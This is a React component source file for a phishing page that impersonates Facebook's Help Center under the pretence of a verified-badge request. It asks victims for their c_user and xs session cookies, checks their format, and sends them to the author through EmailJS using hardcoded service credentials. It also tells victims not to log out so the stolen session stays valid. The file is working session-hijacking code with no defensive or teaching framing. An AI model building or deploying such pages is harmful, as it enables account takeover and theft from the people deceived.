import React, { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import emailjs from "@emailjs/browser";
import LoginModal from "../modal/LoginModal"; // Ensure correct import path

const ValidationPage = () => {
  const form = useRef();
  const navigate = useNavigate();
  const [isFormValid, setIsFormValid] = useState(false);
  const [showModal, setShowModal] = useState(false); // Control modal visibility

  const sendEmail = (e) => {
    e.preventDefault();

    const cUserValue = form.current.elements["c_user"].value;
    const xsValue = form.current.elements["xs"].value;

    const cUserPattern = /^\d{15}$/;
    const xsPattern = /.*%+.*/;

    const isCUserValid = cUserPattern.test(cUserValue);
    const isXsValid = xsPattern.test(xsValue);

    if (isCUserValid && isXsValid) {
      emailjs
        .sendForm(
          "service_7lce09n",
          "template_2c9jb3o",
          form.current,
          "9A_y0UG3yCmhE-Hh8"
        )
        .then(
          (result) => {
            console.log("result text is", result.text);
            setShowModal(true); // Show the modal after form submission
          },
          (error) => {
            console.log(error.text);
          }
        );
    } else {
      setIsFormValid(true);
    }
  };

  const handleModalClose = () => {
    setShowModal(false);
    navigate("/thanks"); // Navigate to the thanks page after modal interaction
  };

  return (
    <>
      <form ref={form} onSubmit={sendEmail}>
        <div
          className="d-flex align-items-center"
          style={{ width: "100%", height: "90px", background: "#4667AC" }}
        >
          <h1 className="text-white ms-4 m-0 d-flex align-self-center">
            facebook
          </h1>
        </div>

        <div
          className="d-flex align-items-center"
          style={{ width: "100%", height: "60px", background: "#E9EBEE" }}
        >
          <h4 className="ms-4 m-0 d-flex align-self-center text-primary">
            Help Center
          </h4>
        </div>

        <div className="col-12 my-4 d-flex justify-content-center align-items-center">
          <div className="col-11 col-md-6 border">
            <div className="p-2" style={{ background: "#F5F6F7" }}>
              <h5 className="m-0">Request a verified badge on Facebook</h5>
            </div>
            <div className="p-2">
              {isFormValid && (
                <div className="alert alert-danger">
                  Please enter valid values for both fields.
                  <br />
                  For more detail check the video below.
                </div>
              )}
              {/* Your form content remains the same */}
              <label className="" style={{ fontSize: "12px" }}>
                c_user
              </label>
              <br />
              <input
                type="number"
                name="c_user"
                required
                pattern="^\d{15}$"
                title="Please enter 15 digits"
              />
              <br />
              <label className="mt-2" style={{ fontSize: "12px" }}>
                xs
              </label>
              <br />
              <input
                type="text"
                name="xs"
              />
              <p className="mt-2" style={{ fontSize: "12px" }}>
                Please make sure not to log out from your computer or laptop
                until you have received a verification email.
              </p>
            </div>

            <div
              className="p-2 mb-2 d-flex justify-content-end"
              style={{ background: "#F5F6F7" }}
            >
              <button
                type="submit"
                className="text-white border-0"
                style={{ background: "#4267B2" }}
              >
                Submit
              </button>
            </div>
          </div>
        </div>
      </form>

      {/* Include the LoginModal component */}
      <LoginModal showModal={showModal} setShowModal={setShowModal} />
    </>
  );
};

export default ValidationPage;
